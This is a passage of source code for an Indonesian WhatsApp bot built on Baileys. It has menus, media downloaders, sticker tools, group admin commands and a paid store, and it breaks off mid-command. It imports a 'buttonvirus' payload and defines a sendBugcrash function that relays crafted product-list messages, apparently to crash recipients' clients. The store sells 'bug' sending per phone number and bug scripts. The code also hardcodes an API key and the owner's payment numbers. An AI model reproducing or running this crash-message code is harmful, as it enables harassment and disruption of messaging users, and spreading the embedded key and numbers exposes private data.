const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./src/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./src/upload')
const tiktok = require('./src/tiktok')
const { ytMp4, ytMp3, ytPlay } = require('./lib/yotube')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString());

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'Mukhammad Alfin Hidayatulloh'//ubah nama lu
global.botName = 'CAIER'//ubah nama bot lu
global.author = '© CAILIN'//ubah keinginan mu
global.packname = 'CAIER AND CAILIN'//ubah keinginan mau
global.ownerNumber = ["6289699565795@s.whatsapp.net"]//ubah nomer lu
global.prefa = ['','.']
global.yt = 'http://youtube.com/@AlfinQWe'//ubah nama yt lu
global.mess = {
wait: 'PROSES...',
succes: 'SUKSES✓',
admin: 'Fitur ini spesial Untuk Admin Grup',
botAdmin: 'Jadikan Saya Admin Terlebih dahulu',
owner: 'Hanya Bisa Di Gunakan Oleh Owner',
group: 'Fitur Hanya Bisa Di Gunakan Di Grup',
private: 'Fitur Hanya Bisa Di Gunakan Di Chat Pribadi',
bot: 'Fitur Spesial Untuk Pengguna Saya',
error: 'Erorr Mohon Coba Beberapa Saat Lagi',
}

module.exports = ap = async (ap, ardian, chatUpdate, store) => {
try {
        const body = (ardian.mtype === 'conversation') ? ardian.message.conversation : (ardian.mtype == 'imageMessage') ? ardian.message.imageMessage.caption : (ardian.mtype == 'videoMessage') ? ardian.message.videoMessage.caption : (ardian.mtype == 'extendedTextMessage') ? ardian.message.extendedTextMessage.text : (ardian.mtype == 'buttonsResponseMessage') ? ardian.message.buttonsResponseMessage.selectedButtonId : (ardian.mtype == 'listResponseMessage') ? ardian.message.listResponseMessage.singleSelectReply.selectedRowId : (ardian.mtype == 'templateButtonReplyMessage') ? ardian.message.templateButtonReplyMessage.selectedId : (ardian.mtype === 'messageContextInfo') ? (ardian.message.buttonsResponseMessage?.selectedButtonId || ardian.message.listResponseMessage?.singleSelectReply.selectedRowId || ardian.text) : ''
        const budy = (typeof ardian.text == 'string' ? ardian.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(ardian.message)
        const { type, quotedMsg, mentioned, now, fromMe } = ardian
        const isCmd = body.startsWith(prefix)
        const from = ardian.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = ardian.pushName || "No Name"
        const botNumber = await ap.decodeJid(ap.user.id)
        const itsMeap = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(ardian.sender)
        const itsMe = ardian.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = ardian.quoted ? ardian.quoted : ardian
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = ardian.isGroup ? (ardian.key.participant ? ardian.key.participant : ardian.participant) : ardian.key.remoteJid
             const isGroup = ardian.chat.endsWith('@g.us')
        const groupMetadata = ardian.isGroup ? await ap.groupMetadata(ardian.chat).catch(e => {}) : ''
        const groupName = ardian.isGroup ? groupMetadata.subject : ''
        const participants = ardian.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = ardian.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = ardian.isGroup ? groupMetadata.owner : ''
        const groupMembers = ardian.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = ardian.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = ardian.isGroup ? groupAdmins.includes(ardian.sender) : false
    	const isAdmins = ardian.isGroup ? groupAdmins.includes(ardian.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[ardian.sender]
if (typeof user !== 'object') global.db.users[ardian.sender] = {}
const chats = global.db.chats[ardian.chat]
if (typeof chats !== 'object') global.db.chats[ardian.chat] = {}
} catch (err) {
console.error(err)
}

if (!ap.public) {
if (!ardian.key.fromMe) return
}

if (!ardian.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(ardian.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (ardian.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(ardian.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (ardian.sender.startsWith('212')) return ap.updateBlockStatus(ardian.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
ap.sendPresenceUpdate('composing', from)
ap.readMessages([ardian.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return ap.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `ap`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return ap.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
case 'menu':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator - ${global.author}`
let tampilan_nya = `Hallo ${pushname} 👋 ${ucapanWaktu}😁
𝕊𝕚𝕝𝕒𝕙𝕜𝕒𝕟 ℙ𝕖𝕟𝕔𝕖𝕥 𝕋𝕠𝕞𝕓𝕠𝕝 
𝔻𝕚 𝔹𝕒𝕨𝕒𝕙 𝕌𝕟𝕥𝕦𝕜 𝕃𝕖𝕓𝕚𝕙 𝕃𝕒𝕟𝕛𝕦𝕥
 🕓 : ${wita} WITA
 🗓️ : ${tanggal} 
 ⏱️ : ${runtime(process.uptime())}
 💻 : ${os.platform()}`
ap.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "ℙ𝔼ℝ𝕀ℕ𝕋𝔸ℍ",
rows: [
{title: "Ｓｔｏｒｅ", rowId: prefix+"store", description: "🛒Tᴏᴋᴏ Sᴀʏᴀ"},
{title: "Ｙｏｕｔｕｂｅ", rowId: prefix+"yt", description: "▶️Jᴀɴɢᴀɴ Lᴜᴘᴀ Dɪ Sᴜʙsʀɪʙᴇ Yᴀ Bᴀɴɢ"},
{title: "Ｉｎｓｔａｇｒａｍ", rowId: prefix+"ig", description: "📷Jᴀɴɢᴀɴ Lᴜᴘᴀ Dɪ Fᴏʟʟᴏᴡ ʏᴀ ʙᴀɴɢ"},
{title: "T i k T o k", rowId: prefix+"tt", description: "📷Jᴀɴɢᴀɴ Lᴜᴘᴀ Dɪ Fᴏʟʟᴏᴡ ʏᴀ ʙᴀɴɢ"},
{title: "DOWNLOAD VIDEO", rowId: prefix+"dmnu", description: "⬇️Untuk Menampilkan Perintah Untuk mendownload video"},
{title: "𝙎𝙏𝙄𝘾𝙆𝙀𝙍 𝙈𝘼𝙆𝙀𝙍", rowId: prefix+"stickermaker", description: "♦️Pᴇʀɪɴᴛᴀʜ Uɴᴛᴜᴋ Mᴇᴍʙᴜᴀᴛ Sᴛɪᴄᴋᴇʀ"},
{title: "𝙎𝙀𝙈𝙐𝘼 𝙋𝙀𝙍𝙄𝙉𝙏𝘼𝙃", rowId: prefix+"allmenu", description: "🧩Uɴᴛᴜᴋ Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Sᴇᴍᴜᴀ Pᴇʀɪɴᴛᴀʜ"},
{title: "𝙋𝙀𝙍𝙄𝙉𝙏𝘼𝙃 𝙂𝙍𝙐𝙋", rowId: prefix+"groupmenu", description: "📌Hᴀɴʏᴀ Bɪsᴀ Dɪ Gᴜɴᴀᴋᴀɴ Dɪ Dᴀʟᴀᴍ Gʀᴜᴘ"},
{title: "𝙋𝙀𝙍𝙄𝙉𝙏𝘼𝙃 𝙋𝙀𝙈𝙄𝙇𝙄𝙆", rowId: prefix+"ownmenu", description: "🗳️Pᴇʀɪɴᴛᴀʜ Iɴɪ Hᴀɴʏᴀ Bɪsᴀ Dɪɢᴜɴᴀᴋᴀɴ Oʟᴇʜ Dᴇᴠᴇʟᴏᴠᴇʀ"}]},
],
footer: footer_nya,
mentions:[global.author, sender]})
}
break
case 'store':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator - ${global.author}`
let tampilan_nya = `
Hallo ${pushname} 👋 ${ucapanWaktu}😁
Mau Beli Apa Silahkan 
Pilih List di bawah👇`
ap.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "MURID BUG",
rows: [
{title: " AKSES", rowId: prefix+"transfer", description: "1 Minggu,Rp.5.000"},
{title: " AKSES", rowId: prefix+"transfer", description: "1 Bulan,Rp.10.000"},
{title: " AKSES", rowId: prefix+"transfer", description: "Permanent,Rp.30.000"},
{title: " SEWA BOT", rowId: prefix+"transfer", description: "1 Bulan Rp.,10.000"},
{title: " KIRIM BUG", rowId: prefix+"transfer", description: "1 Nomer,Rp.3.000"}]},

{title: "SCRIPT BOT",
rows: [
{title: "SC STORE", rowId: prefix+"transfer", description: "Sc Store Cocok buat jualan Rp.15.000"},
{title: "SC BUG", rowId: prefix+"transfer", description: "Sc Bug No Pasaran Rp.20.000"},
{title: "SC BUG + Store", rowId: prefix+"transfer", description: "Sc Bug No Pasaran Rp.25.000"}]},
{title: "NOKOS",
rows: [
{title: "Nokos Nya", rowId: prefix+"nksn", description: "klik untuk memilih nokos yg tersedia"}]},
],
footer: footer_nya,
mentions:[global.author, sender]})
}
break
case 'nksn':{
let buttonnks = [
  { buttonId: `${prefix} transfer`, buttonText: { displayText: 'BELI🛒' }, type: 2 }
  ]
  await ap.sendButtonText(ardian.chat, buttonnks, `SILAHKAN PILIH NOKOS YG MAU DI BELI

INDONESIA
SINGAPORE
USA
MALAYSIA
RUSSIA
DLL

SILAHKAN PILIH ANGKA BERDASARKAN NOKOS YG KALIAN MAU`, `${global.author}`, 𝙵𝚎𝚕𝚒𝚌𝚒𝚊)
  }
  break
case 'allmenu':
let timestamp = speed()
let latensi = speed() - timestamp
let tekssss = `╔═══════✪ INFO 	
╠➥🚀 : ${latensi.toFixed(4)} _Second_
╠➥🗳️ : ${os.hostname()}
╠➥💻 : ${os.platform()}
╠➥⏱️ : ${runtime(process.uptime())}
╠═══════❲ WAKTU 
╠➥🕓 : ${wita} WITA
╠➥🗓️ : ${tanggal}
╚═════════════✪
╔═══════✪ MENU PEMILIK
╠➥ Addakses @
╠➥ Delakses @
╠➥ listusr
╠➥ Hidetag
╠➥ Setppbot
╠➥ block
╠➥ unblock
╚═════════════✪
╔═══════✪ MENU GRUP
╠➥ grouplink
╠➥ setgcpp [image]
╠➥ setnama [text]
╠➥ setdesc [text]
╠➥ resetgrouplink
╠➥ kick [reply/tag]
╠➥ hidetag [text]
╠➥ tagall [text]
╠➥ grup (on/off)
╠➥ join [link]
╚═════════════✪
╔═══════✪ DOWNLOADER
╠➥ play [link]
╠➥ tiktok [link]
╠➥ ytmp3 [link]
╠➥ ytmp4 [link]
╚═════════════✪
╔═══════✪ STICKER MAKER
╠➥  S (balas photo/video)
╠➥  wm (balas sticker)
╠➥  sgift (balas video)
╠➥  take (balas sticker)
╠ emojimix (emoji1+emoji2)
╚═════════════✪`
ardian.reply(tekssss)
break
case 'pay':
tekssss = `
╔═══════✪ 💠 allpay 
╠.  Untuk Allpay Silahkah scan qr di atas
╠.  dan jangan lupa kirim bukti tf dan kirim
╠.  bukti transfer atas nama
╠ ❐ : wa.me/6289699565795
╠.  
╚═════════════✪`
ardian.reply(tekssss)
break
case 'tsel':
tekssss = `
╔═══════✪ ❤️ OVO 
╠.  Ini Adalah Nomer OVO Saya
╠ ❐ : 089699565795
╠.  
╚═════════════✪`
ardian.reply(tekssss)
break
case 'gopay':
tekssss = `
╔═══════✪ ✅ GOPAY 
╠   SILAHKAN SCAN QR DI ATAS ATAU
╠   Ini Nomer Gopay Saya
╠ ❐ : 089699565795
╠.  
╚═════════════✪`
ardian.reply(tekssss)
break
case 'dana':
tekssss = `
╔═══════✪ ☑️ DANA 
╠.  SILAHKAN SCAN QR DI ATAS ATAU
╠   Ini Nomer Dana Saya
╠ ❐ : 089699565795
╠.  
╚═════════════✪`
ardian.reply(tekssss)
break
case 'donasi': case 'donate':
tekssss = `╔═══════✪ DONASI
╠➥ : SILAHKAN DONASI LEWAT SINI KAK
╠➥ : DANA : 089699565795
╠➥ : GOPAY : 089699565795
╠➥ : ALLPAY : SCAN LEWAT SITU KAK
╚═════════════✪`
ardian.reply(tekssss)
break
case 'ownmenu':{
return ardian.reply(`╔═══════✪ Menu Pemilik 
╠➥ : Addakses @(user)
╠➥ : Delakses @(user)
╠➥ : Setppbot
╠➥ : hidetag (text)
╠➥ : block
╠➥ : unblock
╚═════════════✪`)
}
break
case 'yt':{
return ardian.reply(`╔═══════✪ YouTube Pemilik 
╠.  Berikut Adalah Channel Youtube Saya
╠ ❐ : bit.ly/ytmtsreal
╠.  Jangan Lupa Di Subscribe Ya
╚═════════════✪`)
}
break
case 'ig':{
return ardian.reply(`╔═══════✪ Instagram Pemilik 
╠.  Berikut Adalah Akun Instagram Saya
╠ ❐ : bit.ly/igmtsreal
╠.  Jangan Lupa Di Folow Ya
╚═════════════✪`)
}
break
case 'tt':{
return ardian.reply(`╔═══════✪ Instagram Pemilik 
╠.  Berikut Adalah Akun TikTok Saya
╠ ❐ : bit.ly/ttmtsreal
╠.  Jangan Lupa Di Folow Ya
╚═════════════✪`)
}
break
case 'ownmenu':{
return ardian.reply(`╔═══════✪ Menu Pemilik 
╠➥ : Addakses @(user)
╠➥ : Delakses @(user)
╠➥ : Setppbot
╠➥ : hidetag (text)
╠➥ : block
╠➥ : unblock
╚═════════════✪
©  MTS4YOU`)
}
break

case 'bot':{
return ardian.reply(`Kenapa Manggil Saya Bang😑`)
}
break
case 'a':{
return ardian.reply(`anjay mabarr`)
}
break
case 'f':{
return ardian.reply(`Sok Asik Lu Kontol`)
}
break
case 'stickermaker':{
return ardian.reply(`╔═══════✪ Sticker Maker
╠ S (balas photo/video)
╠ wm (balas sticker)
╠ sgift (balas video)
╠ take (balas sticker)
╠ emojimix (emoji1+emoji2)
╚═════════════✪`)
}
break
case 'transfer':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`Creator - ${global.author}`
let tampilan_nya = `
Hallo ${pushname} 👋 ${ucapanWaktu}😁
Mau bayar lewat apa?. 
Silahkan Pilih Pencet Tombol di bawah
`

ap.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "❝ℙ𝔼𝕄𝔹𝔸𝕐𝔸ℝ𝔸ℕ❞",
rows: [
{title: " ☑️ 𝔻𝔸ℕ𝔸", rowId: prefix+"dana", description: " "},
{title: " ✅ 𝔾𝕆ℙ𝔸𝕐", rowId: prefix+"gopay", description: " "},
{title: " ❤️ ℙ𝕌𝕃𝕊𝔸 𝕋𝕊𝔼𝕃", rowId: prefix+"tsel", description: " "},
{title: " 💠 𝔸𝕃𝕃ℙ𝔸𝕐", rowId: prefix+"pay", description: " "}]},
],
footer: footer_nya,
mentions:[global.author, sender]})
}
break

case 'unblock': {
let users = ardian.mentionedJid[0] ? ardian.mentionedJid[0] : ardian.quoted ? ardian.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ap.updateBlockStatus(users, 'unblock').then((res) => ardian.reply(jsonformat(res))).catch((err) => ardian.reply(jsonformat(err)))
}
break
case 'block': {
let users = ardian.mentionedJid[0] ? ardian.mentionedJid[0] : ardian.quoted ? ardian.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ap.updateBlockStatus(users, 'block').then((res) => ardian.reply(jsonformat(res))).catch((err) => ardian.reply(jsonformat(err)))
}
break

case 'dmnu':{
return ardian.reply(`╔═══════✪ DOWNLOADER
╠➥ play [link]
╠➥ tiktok [link]
╠➥ ytmp3 [link]
╠➥ ytmp4 [link]
╚═════════════✪`)
}
break
case 'groupmenu':{
return ardian.reply(`╔═══════✪ MENU GRUP
╠➥ grouplink/gl
╠➥ setgcpp [image]
╠➥ setnama [text]
╠➥ setdesc [text]
╠➥ resetgrouplink
╠➥ kick/k [reply/tag]
╠➥ hidetag/h [text]
╠➥ tagall [text]
╠➥ join/jn [link]
╚═════════════✪
© MTS4YOU`)
}
break
case 'tiktok':
 if(!text) return ardian.reply(`Linknya?`)
 anu = await fetchJson(`https://api.yanzbotzz.repl.co/api/download/tiktok?url=${text}&apikey=YanzBotz`)
 ap.sendMessage(ardian.chat, { video: { url: anu.result.video.no_watermark }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: ardian })
 break
case'play': case 'ytplay': {
                if (!text) throw `contoh : ${prefix + command} jedag jedug`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttonsZYK = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: 'Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: 'Video'}, type: 1}
                ]
                let buttonMessageZYK = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: `\nRuntime : ${runtime(process.uptime())}\nSILAHKAN PILIH TOMBOL DI BAWAH`,
                    buttons: buttonsZYK,
                    headerType: 1
                }
                ap.sendMessage(ardian.chat, buttonMessageZYK, { quoted: ardian })
            }
            break
case 'ytmp3':
if (!text) throw `contoh : ${prefix + command} Link Nya`
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return m.reply(`Linknya Jelek`)
ardian.reply(mess.wait)
anu = await ytMp3(`${q}`)
titlenyaa = `JUDUL BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
ap.sendMessage(ardian.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: ardian })
ap.sendMessage(ardian.chat, { audio: { url: anu.result }, mimetype: 'audio/mpeg', fileName: `${anu.title}.mp3` }, { quoted: ardian })
break
case 'ytmp4':
if (!text) throw `Example : ${prefix + command} Link Nya`
let isLinks= args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return m.reply(`Linknya Jelek`)
ardian.reply(mess.wait)
anu = await ytMp4(`${q}`)
titlenyaa = `JUDUL BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
ap.sendMessage(ardian.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: ardian })
ap.sendMessage(ardian.chat, { video: { url: anu.result }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: ardian })
break
	    case 'ppcp': {
                ardian.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                ap.sendMessage(ardian.chat, { image: { url: random.male }, caption: `Cowoknya` }, { quoted: ardian })
                ap.sendMessage(ardian.chat, { image: { url: random.female }, caption: `Ceweknya` }, { quoted: ardian })
            }
	    break
case 'emojimix': {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await ap.sendImageAsSticker(ardian.chat, res.url, ardian, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'proses':{
let tek = (`「 *TRANSAKSI TERTUNDA* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${wita}WITA\n✨ STATUS  : Tertunda\`\`\`\n\n*--------------------------*\n\n*Pesanan ini akan diproses manual oleh admin,* *Tunggu admin memprosesnya🙏*`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE SAYA TUNGGU👍' }, type: 1 },
]
ap.sendMessage(from,
{text: tek,
buttons: btn_menu})
ap.sendMessage(`${global.ownerNumber}`, {text: `Ada yang order Dari @${sender.split("@")[0]}`})
}
break
case 'done':{
let tek = (`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih Telah order di *Ap Store*\nNext Order ya🙏`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE THENKS👍' }, type: 1 },
]
ap.sendMessage(from,
{text: tek,
buttons: btn_menu})
}
break
case 'join':
case 'jn': {
                if (!itsMeap) throw mess.owner
                if (!text) throw 'kirim link grup nya!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Salah!'
                ardian.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await ap.groupAcceptInvite(result).then((res) => ardian.reply(jsonformat(res))).catch((err) => ardian.reply(jsonformat(err)))
            }
            break
            case 'leavegc':
            case 'lgc': {
                if (!itsMeap) throw mess.owner
                await ap.groupLeave(ardian.chat).then((res) => ardian.reply(jsonformat(res))).catch((err) => ardian.reply(jsonformat(err)))
            }
            break
break
case 'swm': case 'stickerwm': case 'wm': case 'take': {  
if (!args.join(" ")) return ardian.reply(`Contoh :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (ardian.quoted.isAnimated === true) {
ap.downloadAndSaveMediaMessage(quoted, "gifee")
ap.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:ardian})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ap.sendImageAsSticker(ardian.chat, media, ardian, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return ardian.reply('maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ap.sendVideoAsSticker(ardian.chat, media, ardian, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
ardian.reply(`kirim video/poto dengan Caption ${prefix + command}\ndurasi vidio minimal 1-9 detik`)
}
}
break
case 'id':{
            ardian.reply(from)
           }
          break

case 'setdesc': case 'setdesk': case 'sd': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await ap.groupUpdateDescription(ardian.chat, text).then((res) => ardian.reply(mess.success)).catch((err) => ardian.reply(jsonformat(err)))
            }
            break
case 'grouplink':
case 'gl': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await ap.groupInviteCode(ardian.chat)
                ap.sendText(ardian.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, ardian, { detectLink: true })
            }
            break
case 'setnama': case 'setsubject': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await ap.groupUpdateSubject(ardian.chat, text).then((res) => ardian.reply(mess.success)).catch((err) => ardian.reply(jsonformat(err)))
            }
            break
           case 'setgrouppp': 
           case 'setgruppp': 
           case 'setgcpp': {
                if (!isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/balas poto dengan keterangan ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/balas poto dengan keterangan ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/balas poto dengan keterangan ${prefix + command}`
                let media = await ap.downloadAndSaveMediaMessage(quoted)
                await ap.updateProfilePicture(ardian.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                ardian.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `TAG ALL

 🌿 *Message : ${q ? q : 'empty'}*\n\n`
                for (let mem of participants) {
                teks += ` @${mem.id.split('@')[0]}\n`
                }
                ap.sendMessage(ardian.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: ardian })
                }
                break
case 'hidetag':
case 'h':  {
            if (!isGroup) throw mess.group
